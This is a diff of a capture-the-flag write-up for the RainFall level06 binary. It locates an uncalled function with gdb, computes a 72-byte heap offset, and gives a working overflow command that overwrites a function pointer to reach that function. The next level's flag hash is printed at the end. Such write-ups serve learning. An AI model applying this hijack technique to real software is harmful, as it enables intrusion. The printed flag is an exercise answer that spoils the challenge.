@@ -1,47 +1,56 @@
-We have three interessant functions:
-main: The main function
-m: The function called at *main+84
-n: An uncalled function
+# level06
 
-The malloc at *main+16 take 0x40 (64) in argument and the address of the result is stocked at $esp+0x1c
-Address:0x804a1a0
-Addres_VM:0x804a008
+The program segfault without parameters and print "Nope" if one is set:
 
-The malloc at *main+32 tke 0x4 in argument and stock th result at $esp+0x18.
-Address:0x804a1f0
-Address_VM:0x804a050
+```bash
+level6@RainFall:~$ ./level6 
+Segmentation fault (core dumped)
+level6@RainFall:~$ ./level6 csd
+Nope
+```
 
+We can see 3 functions: main, m and n that is not called. The last one allow us to cat the `.pass` of the level07:
 
-======================
-At *main+41 it stock the m function address in $edx
+```bash
+(gdb) info functions
+All defined functions:
 
-At *main+46 it stock the pointer of the second malloc
+Non-debugging symbols:
+...
+0x08048454  n
+0x08048468  m
+0x0804847c  main
+```
 
-At *main+50, it stock the m function in the value of $eax->0x804a1f0(address_second_malloc>)
+In the main function, there are two malloc: one of 64 bytes and one of 4 bytes. The second take the address of `m` as value. After, a strcpy from the first parameter of the program to the first malloc is made.
+At the end, a call to the function pointed by the 2nd malloc is made.
 
-At *main+52, it stock the PATH/Name address of the binary in eax
+We can try to overwrite the value of the second malloc.
 
-At *main+55 it increment eax of 4, to go to the first argument of the program
+First, we calculate the length between the address of the 1st malloc and the 2nd. The first is on esp+28, the second on esp+24:
 
-At *main+58, it dereference the pointer:
-EAX: 0xffffb238 --> 0xffffb429 ('A' <repeats 200 times>...)
-->EAX: 0xffffb429 ('A' <repeats 200 times>...)
+```bash
+(gdb) x $esp+0x1c
+0xbffff6ec:     0x0804a008
+(gdb) x $esp+0x18
+0xbffff6e8:     0x0804a050
+(gdb) p/d 0x0804a050 - 0x0804a008
+$1 = 72
+```
 
-At *main+60 it move the address from $eax to $edx
+We try if a segfault occurs with 72 padding bytes:
 
-At *main+75 our first argument parameter value of the program is stocker as the address of eax
+```bash
+(gdb) r $(python -c 'print "\x41" * 72 + "BBBB"')
+Starting program: /home/user/level6/level6 $(python -c 'print "\x41" * 72 + "BBBB"')
 
-At *main+84 it call our first argument parameter value of the program as an address !
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
 
-If we examine the "n" function, we can see it calls system with "/bin/cat /home/user/level7/.pass" in argument
+We can now replace the last four bytes with the address of n:
 
-Ok, We have to put the address of the function "n" in the first argument parameter value to print the flag 
-
-We have to find the good padding because if we run the programm with "A * 100" we overwrite This address, but not just with 4 bytes
-
-If we subtract the second malloc from the first, we found 72, we can use this calculation in gdb:
-(gdb) p/d 0x804a050-0x804a008
-$2 = 72
-
-we can use this command to get the flag:
-./level6 $(python -c 'print "\x41" * 72 + "\x54\x84\x04\x08"')
+```bash
+level6@RainFall:~$ ./level6 $(python -c 'print "\x41" * 72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
